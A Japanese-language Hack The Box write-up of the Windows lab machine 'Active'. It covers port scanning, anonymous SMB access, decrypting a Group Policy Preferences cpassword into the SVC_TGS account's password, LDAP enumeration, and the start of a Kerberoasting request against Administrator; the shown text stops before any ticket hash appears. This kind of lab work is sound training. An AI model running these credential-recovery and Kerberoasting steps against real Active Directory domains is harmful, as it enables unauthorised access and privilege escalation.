![HTB Banner](https://github.com/hackthebox/writeup-templates/blob/master/machine/assets/images/banner.png?raw=true)


- URL : https://app.hackthebox.com/machines/Active
- #easy 
- OS : #Windows
- Machine Author(s): [eks &](https://app.hackthebox.com/users/302) [mrb3n8132](https://app.hackthebox.com/users/2984)
- Hack Date: 2025-05-08 13:33, User 2025-05-08 15:42 ,Root 2025-05-08 16:32

# Enumeration
空いているポート

| **ポート**   | **サービス**      | **バージョン**                               | **その他**                                           |
| --------- | ------------- | --------------------------------------- | ------------------------------------------------- |
| 53/tcp    | domain        | Microsoft DNS 6.1.7601 (1DB15D39)       | Windows Server 2008 R2 SP1<br>active.htb          |
| 88/tcp    | kerberos-sec  | Microsoft Windows Kerberos              | server time: 2025-05-08 04:31:25Z                 |
| 135/tcp   | msrpc         | Microsoft Windows RPC                   |                                                   |
| 139/tcp   | netbios-ssn   | Microsoft Windows netbios-ssn           |                                                   |
| 389/tcp   | ldap          | Microsoft Windows Active Directory LDAP | Domain: active.htb, Site: Default-First-Site-Name |
| 445/tcp   | SMB           | 不明（?付きのためバージョン特定できず）                    |                                                   |
| 464/tcp   | kpasswd5?     | 不明                                      |                                                   |
| 593/tcp   | ncacn_http    | Microsoft Windows RPC over HTTP 1.0     | banner: ncacn_http/1.0                            |
| 636/tcp   | LDAPS?        | 不明                                      |                                                   |
| 3268/tcp  | ldap          | Microsoft Windows Active Directory LDAP | Domain: active.htb, Site: Default-First-Site-Name |
| 3269/tcp  | tcpwrapped    | 不明                                      |                                                   |
| 5722/tcp  | msrpc         | Microsoft Windows RPC                   |                                                   |
| 9389/tcp  | mc-nmf        | .NET Message Framing                    |                                                   |
| 47001/tcp | WinRMのバックエンド？ | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) | http-server-header: Microsoft-HTTPAPI/2.0         |
| 49152/tcp | msrpc         | Microsoft Windows RPC                   |                                                   |
| 49153/tcp | msrpc         | Microsoft Windows RPC                   |                                                   |
| 49154/tcp | msrpc         | Microsoft Windows RPC                   |                                                   |
| 49155/tcp | msrpc         | Microsoft Windows RPC                   |                                                   |
| 49157/tcp | ncacn_http    | Microsoft Windows RPC over HTTP 1.0     | banner: ncacn_http/1.0                            |
| 49158/tcp | msrpc         | Microsoft Windows RPC                   |                                                   |
| 49165/tcp | msrpc         | Microsoft Windows RPC                   |                                                   |
| 49170/tcp | msrpc         | Microsoft Windows RPC                   |                                                   |
| 49173/tcp | msrpc         | Microsoft Windows RPC                   |                                                   |
- Sambaが空いてるので見てみる
- HTTPも見てみる
	-  593
	-  49157
		- ncacn_http/1.0
			- NCACN_HTTP = Network Computing Architecture Connection-oriented over HTTP
			- RPC over HTTP v1（古い名称）とも呼ばれるプロトコル。
			- Microsoftが開発した、DCOM（分散COM）/RPC 通信を HTTP/HTTPS 上で実現する方法。
			- 通常、TCP 593（ncacn_http）などのポートで通信。
			- 企業のファイアウォール越しの通信などに利用されることが多い。
	- 47001
		- WinRmなのでは？
		- バックエンドのportで、接続ポートは、5985,5986なので、最初のアクセスでは使えない
- DNS
	- active.htbとある

## Nmap
```bash
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-08 04:31:25Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
|_banner: ncacn_http/1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5722/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
|_banner: ncacn_http/1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49165/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49170/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49173/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Home Server 2011 (Windows Server 2008 R2) (96%), Microsoft Windows Server 2008 SP1 (96%), Microsoft Windows Server 2008 SP2 (96%), Microsoft Windows 7 (96%), Microsoft Windows 7 SP0 - SP1 or Windows Server 2008 (96%), Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1 (96%), Microsoft Windows 7 SP1 (96%), Microsoft Windows 7 Ultimate (96%), Microsoft Windows 7 Ultimate SP1 or Windows 8.1 Update 1 (96%)
No exact OS matches for host (test conditions non-ideal).
```

## SMB
- 匿名ログインでアクセスできた
- 匿名ログインで情報を取得できるのが、Replicationだけだった

```sh
└──╼ [★]$ smbclient -N -L //$Target_IP/Replication/
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      

```

- /Replicationの構造
```tree
Replication
└── active.htb
    ├── DfsrPrivate
    │   ├── ConflictAndDeleted [empty]
    │   ├── Deleted [empty]
    │   └── Installing [empty]
    ├── Policies
    │   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
    │   │   ├── GPT.INI [file]
    │   │   ├── Group Policy [empty]
    │   │   ├── MACHINE
    │   │   │   ├── Microsoft
    │   │   │   │   └── Windows NT
    │   │   │   │       └── SecEdit
    │   │   │   │           └── GptTmpl.inf [file]
    │   │   │   ├── Preferences
    │   │   │   │   └── Groups
    │   │   │   │       └── Groups.xml [file]
    │   │   │   └── Registry.pol [file]
    │   │   └── USER [empty]
    │   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
    │       ├── GPT.INI [file]
    │       ├── MACHINE
    │       │   └── Microsoft
    │       │       └── Windows NT
    │       │           └── SecEdit
    │       │               └── GptTmpl.inf [file]
    │       └── USER [empty]
    └── scripts [empty]
```


`\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf`
- パスワードポリシーが書いてある
- 辞書攻撃に使えるかもしれない
```inf
└──╼ [★]$ cat *.inf
��[Unicode]
Unicode=yes
[System Access]
MinimumPasswordAge = 1
MaximumPasswordAge = 42
MinimumPasswordLength = 7
PasswordComplexity = 1
PasswordHistorySize = 24
LockoutBadCount = 0
RequireLogonToChangePassword = 0
ForceLogoffWhenHourExpire = 0
ClearTextPassword = 0
LSAAnonymousNameLookup = 0
[Kerberos Policy]
MaxTicketAge = 10
MaxRenewAge = 7
MaxServiceAge = 600
MaxClockSkew = 5
TicketValidateClient = 1
[Registry Values]
MACHINE\System\CurrentControlSet\Control\Lsa\NoLMHash=4,1
[Version]
signature="$CHICAGO$"
Revision=1

```

`\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\Preferences\Groups\Groups.xml`
```xml
└──╼ [★]$ cat Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>

```
認証情報？ なんだ？
- SVC_TGS:edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
- https://www.mindpointgroup.com/blog/privilege-escalation-via-group-policy-preferences-gpp
	- 「cpassword」フィールドの値 : MicrosoftがAES32ビットキーで暗号化してるから
		- AESで使用されるキーは静的かつ公開されている
		- https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN
		- → 平文のパスワードを復号化できることを意味している

複合化してくれるツールがあるので、復号化する
- https://www.kali.org/tools/gpp-decrypt/
```sh
└──╼ [★]$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```

### 認証情報1
SVC_TGS:GPPstillStandingStrong2k18
認証情報のテスト
```sh
└──╼ [★]$ smbmap -u SVC_TGS -p 'GPPstillStandingStrong2k18' -H 10.129.213.56 
[+] IP: 10.129.213.56:445	Name: active.htb                                        
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY
```


`\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\machine\Registry.pol`
- レジストリのデータらしくて、catで表示できない
- これで中身文字化けせずに読めるかな
	- https://github.com/jtpereyda/regpol
regpolでの出力結果
```sh
└──╼ [★]$ regpol Registry.pol
Software\Policies\Microsoft\SystemCertificates\EFS
    value: EFSBlob
    type:  3 REG_BINARY
    size:  971
    data:  b'\x01\x00\x01\x00\x01\x00\x00\x00\xc3\x03\x00\x00\xbf\x03\x00\x00\x1c\x00\x00\x00\x02\x00\x00\x00\x87\x03\x00\x008\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00\xaf\x19-\x18\x04\xb5\x00\xbe=\x1a\xfdv\xf4\x01\x00\x000\x82\x03\x830\x82\x02k\xa0\x03\x02\x01\x02\x02\x10tu\x18B5\t\x11\x88B\x8c,\xea_\x90\'\xc80\r\x06\t*\x86H\x86\xf7\r\x01\x01\x05\x05\x000P1\x160\x14\x06\x03U\x04\x03\x13\rAdministrator1\x0c0\n\x06\x03U\x04\x07\x13\x03EFS1(0&\x06\x03U\x04\x0b\x13\x1fEFS File Encryption Certificate0 \x17\r180718185345Z\x18\x0f21180624185345Z0P1\x160\x14\x06\x03U\x04\x03\x13\rAdministrator1\x0c0\n\x06\x03U\x04\x07\x13\x03EFS1(0&\x06\x03U\x04\x0b\x13\x1fEFS File Encryption Certificate0\x82\x01"0\r\x06\t*\x86H\x86\xf7\r\x01\x01\x01\x05\x00\x03\x82\x01\x0f\x000\x82\x01\n\x02\x82\x01\x01\x00\x8a\xed&\xe8L\xbf\xff?6\\\n>k\xcb\t\xecf)\xa2ZU\xf0\x18\xe5g#\x9c\xe6\xb8\x8e{\xe6\xd52\xbb\x8ct\xf7!\x12\x13\xab$\x80t\x94\x13c\xa4\x9aR#\x01i\x9a\xaaS\xff>Y\xca\x1d\x06\xfa\x97\x1dl\x85\x8cJ\x023G+\xda\xbb&_\xaa;\xe1r.U\x8f\xee\x01\xa8\x0eX\x15f!\x08_:R\xd5pV\xfa\xc1x\x98\x1c\xa5B3\xe0J\x02\x9f\xa2\xc06Ef\xbc\x1f\x8bZ=l\x00\xa6N\xa0\x9d\xbe\xd2\x88\x04LEA\xb5\x85\xdc\xc5L\xbe\xbep\x99\xbe1\xb6\xdc\xe6\xa4\xf9+RkM\xfa\xf8kZ\x8f\\\xb8\x82\xcc\x85\x91d\xc2\x91\xa6\x9f\xa32Q\xf2{\x174\xd0?\xc8}\xc2\x96\x13\x00\x08\x98\xd6.qx\xde\xe8-ik)V^\x13\x9b\xa7\x11\xf1\xd5!6\x0e\xdd\x1c\xd0\xd6\xf4d\xe7\xdd|\xa6\x06>\xa2\x8frcjj\xb1\xa0W\x19bl\xca\xd0\x11\xa13\xb4\x8c\x16f\xa8\xa0d\x82\x80\xee\x06\xfb\x8d\xc7\xd4\x92\xc6\x03\x02\x03\x01\x00\x01\xa3W0U0\x16\x06\x03U\x1d%\x04\x0f0\r\x06\x0b+\x06\x01\x04\x01\x827\n\x03\x04\x0100\x06\x03U\x1d\x11\x04)0\'\xa0%\x06\n+\x06\x01\x04\x01\x827\x14\x02\x03\xa0\x17\x0c\x15Administrator@ACTIVE\x000\t\x06\x03U\x1d\x13\x04\x020\x000\r\x06\t*\x86H\x86\xf7\r\x01\x01\x05\x05\x00\x03\x82\x01\x01\x00&\xef$\thV\xda\xbb[\x1e\x97\\\xb0\xec\xce\x06\x01\xd0m\xd9P\xa4\x01D\xbb\xfd\xca\x84\xd4$\xe8\x9bAk\xafi\xfc\x9e0\x8a\xf0\x7f\x1a\xb7\xdd.\xd2\xf70%\xf82\xd1\xb4J\x12\x1d)\xf5\x89\x91\x1c/\xe6f\xfc\x8d\xb3\x0c\xf9\xe4\xe8Z\x07s\x92\x89P\x96\xcd9\x84\x84\x94\x87 \x0f\xf7\xaa\x1b\xbc\xe7\xfa\x19#\xfa\xc8r\xb9\x1c{\x90l\xdb\xa6\x82S\xa3\xdf\xa8\xcc\xbb\xa3\x8d\xe8\x83\x87\x02\xe1\x11b\x96\x98$7gYZ\xe9\xfb\xee\x90C\x7fwn\x1d}\xb5\xcd@\xb3`\xed\xc9\xf7\x08&l\xefN\xfc\x89@7T\xcb\x89P@\xdf\xfbr\xbf\xd4N\xb6\x19\x139r\x066c\xdf\x8c\x85?\x1bL\x02\xfb\xb9F\xdd\x87\xb2\x1f\xcchH\xa3\xe0(h\xbbAckY\x1a6U=\xa3\xfe#\xe1y/Y\xbaUwFL\xc6\xa6\xfa\xc6M5\x11I[Xq\x80\xf7\xc4\x0f\x8f&\x17y\xf5\xc2\x0f\xcc^v_\x99\xdbF\xce\x8b.nt\x01]\x99hs\x05'

Software\Policies\Microsoft\SystemCertificates\EFS\Certificates\3D33FC7B7C6F982A07A49A5C76DA805938A16C6A
    value: Blob
    type:  3 REG_BINARY
    size:  1163
    data:  b'\x02\x00\x00\x00\x01\x00\x00\x00\xcc\x00\x00\x00\x1c\x00\x00\x00l\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x002\x005\x005\x003\x005\x00a\x003\x006\x00-\x004\x00e\x00e\x003\x00-\x004\x002\x00b\x009\x00-\x009\x005\x00d\x000\x00-\x00b\x002\x00f\x000\x003\x00a\x002\x008\x00a\x00c\x001\x00a\x00\x00\x00\x00\x00\x00\x00\x00\x00M\x00i\x00c\x00r\x00o\x00s\x00o\x00f\x00t\x00 \x00E\x00n\x00h\x00a\x00n\x00c\x00e\x00d\x00 \x00C\x00r\x00y\x00p\x00t\x00o\x00g\x00r\x00a\x00p\x00h\x00i\x00c\x00 \x00P\x00r\x00o\x00v\x00i\x00d\x00e\x00r\x00 \x00v\x001\x00.\x000\x00\x00\x00\x00\x00\x03\x00\x00\x00\x01\x00\x00\x00\x14\x00\x00\x00=3\xfc{|o\x98*\x07\xa4\x9a\\v\xda\x80Y8\xa1lj \x00\x00\x00\x01\x00\x00\x00\x87\x03\x00\x000\x82\x03\x830\x82\x02k\xa0\x03\x02\x01\x02\x02\x10tu\x18B5\t\x11\x88B\x8c,\xea_\x90\'\xc80\r\x06\t*\x86H\x86\xf7\r\x01\x01\x05\x05\x000P1\x160\x14\x06\x03U\x04\x03\x13\rAdministrator1\x0c0\n\x06\x03U\x04\x07\x13\x03EFS1(0&\x06\x03U\x04\x0b\x13\x1fEFS File Encryption Certificate0 \x17\r180718185345Z\x18\x0f21180624185345Z0P1\x160\x14\x06\x03U\x04\x03\x13\rAdministrator1\x0c0\n\x06\x03U\x04\x07\x13\x03EFS1(0&\x06\x03U\x04\x0b\x13\x1fEFS File Encryption Certificate0\x82\x01"0\r\x06\t*\x86H\x86\xf7\r\x01\x01\x01\x05\x00\x03\x82\x01\x0f\x000\x82\x01\n\x02\x82\x01\x01\x00\x8a\xed&\xe8L\xbf\xff?6\\\n>k\xcb\t\xecf)\xa2ZU\xf0\x18\xe5g#\x9c\xe6\xb8\x8e{\xe6\xd52\xbb\x8ct\xf7!\x12\x13\xab$\x80t\x94\x13c\xa4\x9aR#\x01i\x9a\xaaS\xff>Y\xca\x1d\x06\xfa\x97\x1dl\x85\x8cJ\x023G+\xda\xbb&_\xaa;\xe1r.U\x8f\xee\x01\xa8\x0eX\x15f!\x08_:R\xd5pV\xfa\xc1x\x98\x1c\xa5B3\xe0J\x02\x9f\xa2\xc06Ef\xbc\x1f\x8bZ=l\x00\xa6N\xa0\x9d\xbe\xd2\x88\x04LEA\xb5\x85\xdc\xc5L\xbe\xbep\x99\xbe1\xb6\xdc\xe6\xa4\xf9+RkM\xfa\xf8kZ\x8f\\\xb8\x82\xcc\x85\x91d\xc2\x91\xa6\x9f\xa32Q\xf2{\x174\xd0?\xc8}\xc2\x96\x13\x00\x08\x98\xd6.qx\xde\xe8-ik)V^\x13\x9b\xa7\x11\xf1\xd5!6\x0e\xdd\x1c\xd0\xd6\xf4d\xe7\xdd|\xa6\x06>\xa2\x8frcjj\xb1\xa0W\x19bl\xca\xd0\x11\xa13\xb4\x8c\x16f\xa8\xa0d\x82\x80\xee\x06\xfb\x8d\xc7\xd4\x92\xc6\x03\x02\x03\x01\x00\x01\xa3W0U0\x16\x06\x03U\x1d%\x04\x0f0\r\x06\x0b+\x06\x01\x04\x01\x827\n\x03\x04\x0100\x06\x03U\x1d\x11\x04)0\'\xa0%\x06\n+\x06\x01\x04\x01\x827\x14\x02\x03\xa0\x17\x0c\x15Administrator@ACTIVE\x000\t\x06\x03U\x1d\x13\x04\x020\x000\r\x06\t*\x86H\x86\xf7\r\x01\x01\x05\x05\x00\x03\x82\x01\x01\x00&\xef$\thV\xda\xbb[\x1e\x97\\\xb0\xec\xce\x06\x01\xd0m\xd9P\xa4\x01D\xbb\xfd\xca\x84\xd4$\xe8\x9bAk\xafi\xfc\x9e0\x8a\xf0\x7f\x1a\xb7\xdd.\xd2\xf70%\xf82\xd1\xb4J\x12\x1d)\xf5\x89\x91\x1c/\xe6f\xfc\x8d\xb3\x0c\xf9\xe4\xe8Z\x07s\x92\x89P\x96\xcd9\x84\x84\x94\x87 \x0f\xf7\xaa\x1b\xbc\xe7\xfa\x19#\xfa\xc8r\xb9\x1c{\x90l\xdb\xa6\x82S\xa3\xdf\xa8\xcc\xbb\xa3\x8d\xe8\x83\x87\x02\xe1\x11b\x96\x98$7gYZ\xe9\xfb\xee\x90C\x7fwn\x1d}\xb5\xcd@\xb3`\xed\xc9\xf7\x08&l\xefN\xfc\x89@7T\xcb\x89P@\xdf\xfbr\xbf\xd4N\xb6\x19\x139r\x066c\xdf\x8c\x85?\x1bL\x02\xfb\xb9F\xdd\x87\xb2\x1f\xcchH\xa3\xe0(h\xbbAckY\x1a6U=\xa3\xfe#\xe1y/Y\xbaUwFL\xc6\xa6\xfa\xc6M5\x11I[Xq\x80\xf7\xc4\x0f\x8f&\x17y\xf5\xc2\x0f\xcc^v_\x99\xdbF\xce\x8b.nt\x01]\x99hs\x05'

Software\Policies\Microsoft\SystemCertificates\EFS\CRLs
    value: 
    type:  0 REG_NONE
    size:  0
    data:  b''

Software\Policies\Microsoft\SystemCertificates\EFS\CTLs
    value: 
    type:  0 REG_NONE
    size:  0
    data:  b''


```

- `\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI`
```INI
[General]
Version=1
```

- `\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf`
	- 権限をどのSIDが持ってるかが書いてある？
```inf
└──╼ [★]$ cat GptTmpl.inf
��[Unicode]
Unicode=yes
[Registry Values]
MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
[Privilege Rights]
SeAssignPrimaryTokenPrivilege = *S-1-5-20,*S-1-5-19
SeAuditPrivilege = *S-1-5-20,*S-1-5-19
SeBackupPrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeBatchLogonRight = *S-1-5-32-559,*S-1-5-32-551,*S-1-5-32-544
SeChangeNotifyPrivilege = *S-1-5-32-554,*S-1-5-11,*S-1-5-32-544,*S-1-5-20,*S-1-5-19,*S-1-1-0
SeCreatePagefilePrivilege = *S-1-5-32-544
SeDebugPrivilege = *S-1-5-32-544
SeIncreaseBasePriorityPrivilege = *S-1-5-32-544
SeIncreaseQuotaPrivilege = *S-1-5-32-544,*S-1-5-20,*S-1-5-19
SeInteractiveLogonRight = *S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-548,*S-1-5-32-551,*S-1-5-32-544
SeLoadDriverPrivilege = *S-1-5-32-550,*S-1-5-32-544
SeMachineAccountPrivilege = *S-1-5-11
SeNetworkLogonRight = *S-1-5-32-554,*S-1-5-9,*S-1-5-11,*S-1-5-32-544,*S-1-1-0
SeProfileSingleProcessPrivilege = *S-1-5-32-544
SeRemoteShutdownPrivilege = *S-1-5-32-549,*S-1-5-32-544
SeRestorePrivilege = *S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeSecurityPrivilege = *S-1-5-32-544
SeShutdownPrivilege = *S-1-5-32-550,*S-1-5-32-549,*S-1-5-32-551,*S-1-5-32-544
SeSystemEnvironmentPrivilege = *S-1-5-32-544
SeSystemProfilePrivilege = *S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420,*S-1-5-32-544
SeSystemTimePrivilege = *S-1-5-32-549,*S-1-5-32-544,*S-1-5-19
SeTakeOwnershipPrivilege = *S-1-5-32-544
SeUndockPrivilege = *S-1-5-32-544
SeEnableDelegationPrivilege = *S-1-5-32-544
[Version]
signature="$CHICAGO$"
Revision=1

```


# Foothold

認証情報1を使うことで、匿名ログインじゃアクセスできなかったUsersフォルダにアクセスできた
```bash
└──╼ [★]$ smbclient //10.129.213.56/Users -U SVC_TGS
Password for [WORKGROUP\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 09:39:20 2018
  ..                                 DR        0  Sat Jul 21 09:39:20 2018
  Administrator                       D        0  Mon Jul 16 05:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 00:06:44 2009
  Default                           DHR        0  Tue Jul 14 01:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 00:06:44 2009
  desktop.ini                       AHS      174  Mon Jul 13 23:57:55 2009
  Public                             DR        0  Mon Jul 13 23:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 10:16:32 2018

		10459647 blocks of size 4096. 5203595 blocks available

```

- `Users/desktop.ini`
```bash
└──╼ [★]$ cat desktop.ini
��
[.ShellClassInfo]
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21813
```

users.txtの取得
```bash
smb: \> get SVC_TGS\Desktop\user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as SVC_TGS\Desktop\user.txt (5.5 KiloBytes/sec) (average 5.5 KiloBytes/sec)
```

## LDAP
ldap得られた認証情報1でアクセスできた

どんなユーザーがいるのかの確認
```bash
└──╼ [★]$ ldapsearch -x -H ldap://10.129.213.56 -D "ACTIVE\\SVC_TGS" -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" "(objectClass=user)" sAMAccountName
# extended LDIF
#
# LDAPv3
# base <dc=active,dc=htb> with scope subtree
# filter: (objectClass=user)
# requesting: sAMAccountName 
#

# Administrator, Users, active.htb
dn: CN=Administrator,CN=Users,DC=active,DC=htb
sAMAccountName: Administrator

# Guest, Users, active.htb
dn: CN=Guest,CN=Users,DC=active,DC=htb
sAMAccountName: Guest

# DC, Domain Controllers, active.htb
dn: CN=DC,OU=Domain Controllers,DC=active,DC=htb
sAMAccountName: DC$

# krbtgt, Users, active.htb
dn: CN=krbtgt,CN=Users,DC=active,DC=htb
sAMAccountName: krbtgt

# SVC_TGS, Users, active.htb
dn: CN=SVC_TGS,CN=Users,DC=active,DC=htb
sAMAccountName: SVC_TGS

# search reference
ref: ldap://ForestDnsZones.active.htb/DC=ForestDnsZones,DC=active,DC=htb

# search reference
ref: ldap://DomainDnsZones.active.htb/DC=DomainDnsZones,DC=active,DC=htb

# search reference
ref: ldap://active.htb/CN=Configuration,DC=active,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 9
# numEntries: 5
# numReferences: 3

```
- ユーザー
	- Administrator
	- Guest
	- DC
	- krbtgt
	- SVC-TGS


LDAPで、Kerberastingできるアカウントを探す
- 検索
	- - (!(userAccountControl:1.2.840.113556.1.4.803:=2)) … アカウントが有効
		- ACCOUNTDISABLE ビットが立ってない
	- servicePrincipalName=* … SPN を持つ
		- Kerberos サービスに関連づけられている
```bash
└──╼ [★]$ ldapsearch -x -H ldap://10.129.213.56 -D "ACTIVE\\SVC_TGS" -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" "(&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" sAMAccountName servicePrincipalName userAccountControl
# extended LDIF
#
# LDAPv3
# base <dc=active,dc=htb> with scope subtree
# filter: (&(objectClass=user)(servicePrincipalName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))
# requesting: sAMAccountName servicePrincipalName userAccountControl 
#

# Administrator, Users, active.htb
dn: CN=Administrator,CN=Users,DC=active,DC=htb
userAccountControl: 66048
sAMAccountName: Administrator
servicePrincipalName: active/CIFS:445

# DC, Domain Controllers, active.htb
dn: CN=DC,OU=Domain Controllers,DC=active,DC=htb
userAccountControl: 532480
sAMAccountName: DC$
servicePrincipalName: ldap/DC.active.htb/ForestDnsZones.active.htb
servicePrincipalName: ldap/DC.active.htb/DomainDnsZones.active.htb
servicePrincipalName: TERMSRV/DC
servicePrincipalName: TERMSRV/DC.active.htb
servicePrincipalName: Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/DC.active.htb
servicePrincipalName: DNS/DC.active.htb
servicePrincipalName: GC/DC.active.htb/active.htb
servicePrincipalName: RestrictedKrbHost/DC.active.htb
servicePrincipalName: RestrictedKrbHost/DC
servicePrincipalName: HOST/DC/ACTIVE
servicePrincipalName: HOST/DC.active.htb/ACTIVE
servicePrincipalName: HOST/DC
servicePrincipalName: HOST/DC.active.htb
servicePrincipalName: HOST/DC.active.htb/active.htb
servicePrincipalName: E3514235-4B06-11D1-AB04-00C04FC2DCD2/f4953ea5-0f30-4041-
 b4dd-1a00693a8510/active.htb
servicePrincipalName: ldap/DC/ACTIVE
servicePrincipalName: ldap/f4953ea5-0f30-4041-b4dd-1a00693a8510._msdcs.active.
 htb
servicePrincipalName: ldap/DC.active.htb/ACTIVE
servicePrincipalName: ldap/DC
servicePrincipalName: ldap/DC.active.htb
servicePrincipalName: ldap/DC.active.htb/active.htb

# search reference
ref: ldap://ForestDnsZones.active.htb/DC=ForestDnsZones,DC=active,DC=htb

# search reference
ref: ldap://DomainDnsZones.active.htb/DC=DomainDnsZones,DC=active,DC=htb

# search reference
ref: ldap://active.htb/CN=Configuration,DC=active,DC=htb

# search result
search: 2
result: 0 Success

# numResponses: 6
# numEntries: 2
# numReferences: 3

```
- AdministratorにKerberoastingを使えそう

GetUserSPN.pyで、Administratorのサービスチケットを取得する
```sh
└──╼ [★]$ GetUserSPNs.py active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.213.56 -request
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2025-05-07 23:24:21.710546             



[-] CCache file is not found. Skipping...
